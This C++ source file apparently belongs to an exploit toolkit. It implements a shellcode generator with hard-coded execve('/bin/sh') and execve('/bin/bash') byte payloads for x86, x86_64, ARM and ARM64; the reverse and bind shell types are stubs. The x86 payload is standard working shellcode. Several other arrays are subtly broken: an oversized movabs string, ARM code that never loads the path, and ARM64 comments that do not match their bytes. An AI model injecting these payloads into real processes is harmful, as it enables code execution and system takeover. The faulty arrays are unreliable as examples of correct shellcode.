#include "shellcode_generator.h"
#include <algorithm>
#include <sstream>

namespace sentinel {
namespace exploit {

Shellcode ShellcodeGenerator::generate(Architecture arch,
                                       ShellcodeType type,
                                       const ExploitConfig* config) {
    (void)config; 

    switch (type) {
        case ShellcodeType::EXECVE_BIN_SH:
            return generate_execve_binsh(arch);

        case ShellcodeType::EXECVE_BIN_BASH:
            return generate_execve_binbash(arch);

        case ShellcodeType::REVERSE_SHELL:
        case ShellcodeType::BIND_SHELL:
        case ShellcodeType::CUSTOM:
            return Shellcode(type, arch, {}, "Not implemented");
    }

    return Shellcode();
}

Shellcode ShellcodeGenerator::generate_execve_binsh(Architecture arch) {
    std::vector<uint8_t> bytes;
    std::string desc = get_description(ShellcodeType::EXECVE_BIN_SH, arch);

    switch (arch) {
        case Architecture::X86:
            bytes = generate_x86_execve_binsh();
            break;

        case Architecture::X86_64:
            bytes = generate_x86_64_execve_binsh();
            break;

        case Architecture::ARM:
            bytes = generate_arm_execve_binsh();
            break;

        case Architecture::ARM64:
            bytes = generate_arm64_execve_binsh();
            break;

        case Architecture::UNKNOWN:
            break;
    }

    return Shellcode(ShellcodeType::EXECVE_BIN_SH, arch, bytes, desc);
}

Shellcode ShellcodeGenerator::generate_execve_binbash(Architecture arch) {
    std::vector<uint8_t> bytes;
    std::string desc = get_description(ShellcodeType::EXECVE_BIN_BASH, arch);

    switch (arch) {
        case Architecture::X86:
            bytes = generate_x86_execve_binbash();
            break;

        case Architecture::X86_64:
            bytes = generate_x86_64_execve_binbash();
            break;

        case Architecture::ARM:
            bytes = generate_arm_execve_binbash();
            break;

        case Architecture::ARM64:
            bytes = generate_arm64_execve_binbash();
            break;

        case Architecture::UNKNOWN:
            break;
    }

    return Shellcode(ShellcodeType::EXECVE_BIN_BASH, arch, bytes, desc);
}

// x86 (32-bit) shellcode: execve("/bin/sh", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_x86_execve_binsh() {
    // 23-byte execve("/bin/sh") shellcode for x86
    // No null bytes
    return {
        0x31, 0xc0,              // xor eax, eax
        0x50,                    // push eax          ; NULL terminator
        0x68, 0x2f, 0x2f, 0x73, 0x68,  // push 0x68732f2f   ; "//sh"
        0x68, 0x2f, 0x62, 0x69, 0x6e,  // push 0x6e69622f   ; "/bin"
        0x89, 0xe3,              // mov ebx, esp      ; ebx = "/bin//sh"
        0x50,                    // push eax          ; NULL
        0x53,                    // push ebx          ; "/bin//sh"
        0x89, 0xe1,              // mov ecx, esp      ; argv
        0x99,                    // cdq               ; edx = 0 (envp)
        0xb0, 0x0b,              // mov al, 0x0b      ; execve syscall number
        0xcd, 0x80               // int 0x80          ; syscall
    };
}

// x86 (32-bit) shellcode: execve("/bin/bash", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_x86_execve_binbash() {
    // execve("/bin/bash") shellcode for x86
    return {
        0x31, 0xc0,              // xor eax, eax
        0x50,                    // push eax          ; NULL terminator
        0x68, 0x62, 0x61, 0x73, 0x68,  // push "bash"
        0x68, 0x2f, 0x62, 0x69, 0x6e,  // push "/bin"
        0x89, 0xe3,              // mov ebx, esp      ; ebx = "/bin/bash"
        0x50,                    // push eax          ; NULL
        0x53,                    // push ebx          ; "/bin/bash"
        0x89, 0xe1,              // mov ecx, esp      ; argv
        0x99,                    // cdq               ; edx = 0
        0xb0, 0x0b,              // mov al, 0x0b      ; execve
        0xcd, 0x80               // int 0x80
    };
}

// x86_64 (64-bit) shellcode: execve("/bin/sh", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_x86_64_execve_binsh() {
    // 27-byte execve("/bin/sh") shellcode for x86_64
    // No null bytes
    return {
        0x48, 0x31, 0xd2,        // xor rdx, rdx      ; envp = NULL
        0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e,  // movabs rbx,
        0x2f, 0x73, 0x68,                           // 0x68732f6e69622f2f ("//bin/sh")
        0x48, 0xc1, 0xeb, 0x08,  // shr rbx, 8        ; align to "/bin//sh"
        0x53,                    // push rbx          ; "/bin//sh"
        0x48, 0x89, 0xe7,        // mov rdi, rsp      ; rdi = "/bin//sh"
        0x48, 0x31, 0xf6,        // xor rsi, rsi      ; argv = NULL
        0xb0, 0x3b,              // mov al, 0x3b      ; execve syscall (59)
        0x0f, 0x05               // syscall
    };
}

// x86_64 (64-bit) shellcode: execve("/bin/bash", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_x86_64_execve_binbash() {
    // execve("/bin/bash") shellcode for x86_64
    return {
        0x48, 0x31, 0xd2,        // xor rdx, rdx
        0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e,  // movabs rax,
        0x2f, 0x62, 0x61, 0x73, 0x68,        // "/bin/bash\0"
        0x50,                    // push rax
        0x48, 0x89, 0xe7,        // mov rdi, rsp
        0x48, 0x31, 0xf6,        // xor rsi, rsi
        0xb0, 0x3b,              // mov al, 0x3b
        0x0f, 0x05               // syscall
    };
}

// ARM (32-bit) shellcode: execve("/bin/sh", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_arm_execve_binsh() {
    // ARM execve("/bin/sh") shellcode
    // ARM uses different syscall convention (SWI)
    return {
        0x01, 0x30, 0x8f, 0xe2,  // add r3, pc, #1
        0x13, 0xff, 0x2f, 0xe1,  // bx r3              ; switch to Thumb mode
        // Thumb mode instructions:
        0x01, 0x20,              // movs r0, #1
        0x42, 0x40,              // eors r0, r0        ; r0 = 0
        0x0b, 0x27,              // movs r7, #11       ; execve syscall
        0x01, 0xdf,              // svc #1             ; syscall
        // Data:
        0x2f, 0x62, 0x69, 0x6e,  // "/bin"
        0x2f, 0x73, 0x68, 0x00   // "/sh\0"
    };
}

// ARM (32-bit) shellcode: execve("/bin/bash", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_arm_execve_binbash() {
    // ARM execve("/bin/bash") shellcode
    return {
        0x01, 0x30, 0x8f, 0xe2,  // add r3, pc, #1
        0x13, 0xff, 0x2f, 0xe1,  // bx r3
        0x01, 0x20,              // movs r0, #1
        0x42, 0x40,              // eors r0, r0
        0x0b, 0x27,              // movs r7, #11
        0x01, 0xdf,              // svc #1
        0x2f, 0x62, 0x69, 0x6e,  // "/bin"
        0x2f, 0x62, 0x61, 0x73,  // "/bas"
        0x68, 0x00, 0x00, 0x00   // "h\0\0\0"
    };
}

// ARM64 (AArch64) shellcode: execve("/bin/sh", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_arm64_execve_binsh() {
    // ARM64 execve("/bin/sh") shellcode
    // Uses SVC instruction for syscall
    return {
        0xe0, 0x45, 0x8c, 0xd2,  // mov x0, #0x622f      ; "/b"
        0x20, 0xcd, 0xad, 0xf2,  // movk x0, #0x6e69, lsl #16  ; "in"
        0x20, 0x8f, 0xdf, 0xf2,  // movk x0, #0x7c79, lsl #32  ; "/s"
        0x00, 0x01, 0x00, 0xf9,  // str x0, [x8]
        0xe1, 0x03, 0x1f, 0xaa,  // mov x1, xzr          ; argv = NULL
        0xe2, 0x03, 0x1f, 0xaa,  // mov x2, xzr          ; envp = NULL
        0xa8, 0x1b, 0x80, 0xd2,  // mov x8, #221         ; execve syscall
        0x01, 0x00, 0x00, 0xd4   // svc #0
    };
}

// ARM64 (AArch64) shellcode: execve("/bin/bash", NULL, NULL)
std::vector<uint8_t> ShellcodeGenerator::generate_arm64_execve_binbash() {
    // ARM64 execve("/bin/bash") shellcode
    return {
        0xe0, 0x45, 0x8c, 0xd2,  // mov x0, #0x622f
        0x20, 0xcd, 0xad, 0xf2,  // movk x0, #0x6e69, lsl #16
        0x20, 0x19, 0xc2, 0xf2,  // movk x0, #0x10c9, lsl #32
        0x00, 0x01, 0x00, 0xf9,  // str x0, [x8]
        0xe1, 0x03, 0x1f, 0xaa,  // mov x1, xzr
        0xe2, 0x03, 0x1f, 0xaa,  // mov x2, xzr
        0xa8, 0x1b, 0x80, 0xd2,  // mov x8, #221
        0x01, 0x00, 0x00, 0xd4   // svc #0
    };
}

bool ShellcodeGenerator::has_null_bytes(const std::vector<uint8_t>& shellcode) {
    return std::find(shellcode.begin(), shellcode.end(), 0x00) != shellcode.end();
}

std::string ShellcodeGenerator::get_description(ShellcodeType type, Architecture arch) {
    std::ostringstream oss;

    std::string arch_name;
    switch (arch) {
        case Architecture::X86:    arch_name = "x86"; break;
        case Architecture::X86_64: arch_name = "x86_64"; break;
        case Architecture::ARM:    arch_name = "ARM"; break;
        case Architecture::ARM64:  arch_name = "ARM64"; break;
        default:                   arch_name = "unknown"; break;
    }

    switch (type) {
        case ShellcodeType::EXECVE_BIN_SH:
            oss << arch_name << " shellcode: execve(\"/bin/sh\", NULL, NULL)";
            break;

        case ShellcodeType::EXECVE_BIN_BASH:
            oss << arch_name << " shellcode: execve(\"/bin/bash\", NULL, NULL)";
            break;

        case ShellcodeType::REVERSE_SHELL:
            oss << arch_name << " reverse shell shellcode";
            break;

        case ShellcodeType::BIND_SHELL:
            oss << arch_name << " bind shell shellcode";
            break;

        case ShellcodeType::CUSTOM:
            oss << arch_name << " custom shellcode";
            break;
    }

    return oss.str();
}

} // namespace exploit
} // namespace sentinel
